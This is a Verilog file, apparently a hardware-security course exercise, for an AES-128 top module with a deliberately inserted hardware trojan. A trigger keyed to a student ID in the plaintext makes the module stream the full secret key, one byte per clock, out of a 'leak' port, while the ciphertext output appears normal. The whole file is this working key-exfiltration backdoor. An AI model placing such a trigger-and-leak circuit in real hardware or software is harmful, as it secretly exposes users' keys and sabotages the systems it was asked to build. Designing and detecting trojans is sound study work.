`timescale 1ns / 1ps

module AES_top #(
    parameter STUDENT_ID = 32'd112021101  
)(
    input clk,
    input rst,
    input [127:0] plaintext,
    input [127:0] key,
    output reg [127:0] out,       
    output reg [7:0] leak
);

    wire [127:0] ciphertext;

    aes_128 aes (
        .clk(clk),
        .state(plaintext),
        .key(key),
        .out(ciphertext)
    );

    always @(*) begin
        out = ciphertext;
    end

    reg [1:0] match_count;
    reg [127:0] prev_pt;
    reg first_cycle;
    reg [4:0] leak_cnt;

    wire is_match   = (plaintext[31:0] == STUDENT_ID[31:0]);
    wire pt_changed = first_cycle || (plaintext != prev_pt);

    wire trigger_now = (match_count == 2'd2) && pt_changed && is_match;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            match_count <= 2'd0;
            prev_pt     <= 128'd0;
            first_cycle <= 1'b1;
        end else begin
            first_cycle <= 1'b0;
            if (pt_changed) begin
                prev_pt <= plaintext;
                if (is_match) begin
                    if (match_count < 2'd3)
                        match_count <= match_count + 1;
                end else begin
                    match_count <= 2'd0;
                end
            end
        end
    end

    reg [7:0] next_leak_byte;
    always @(*) begin
        case (leak_cnt)
            5'd0:  next_leak_byte = key[127:120];
            5'd1:  next_leak_byte = key[119:112];
            5'd2:  next_leak_byte = key[111:104];
            5'd3:  next_leak_byte = key[103:96];
            5'd4:  next_leak_byte = key[95:88];
            5'd5:  next_leak_byte = key[87:80];
            5'd6:  next_leak_byte = key[79:72];
            5'd7:  next_leak_byte = key[71:64];
            5'd8:  next_leak_byte = key[63:56];
            5'd9:  next_leak_byte = key[55:48];
            5'd10: next_leak_byte = key[47:40];
            5'd11: next_leak_byte = key[39:32];
            5'd12: next_leak_byte = key[31:24];
            5'd13: next_leak_byte = key[23:16];
            5'd14: next_leak_byte = key[15:8];
            5'd15: next_leak_byte = key[7:0];
            default: next_leak_byte = 8'd0;
        endcase
    end

    reg leaking;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            leaking  <= 1'b0;
            leak_cnt <= 5'd0;
            leak     <= 8'd0;
        end else begin
            if (trigger_now && !leaking) begin
                leaking  <= 1'b1;
                leak_cnt <= 5'd1; 
                leak     <= key[127:120]; 
            end else if (leaking) begin
                if (leak_cnt < 5'd16) begin
                    leak     <= next_leak_byte;
                    leak_cnt <= leak_cnt + 5'd1;
                end else begin
                    leaking  <= 1'b0;
                    leak_cnt <= 5'd0;
                    leak     <= 8'd0;
                end
            end else begin
                leak <= 8'd0;
            end
        end
    end

endmodule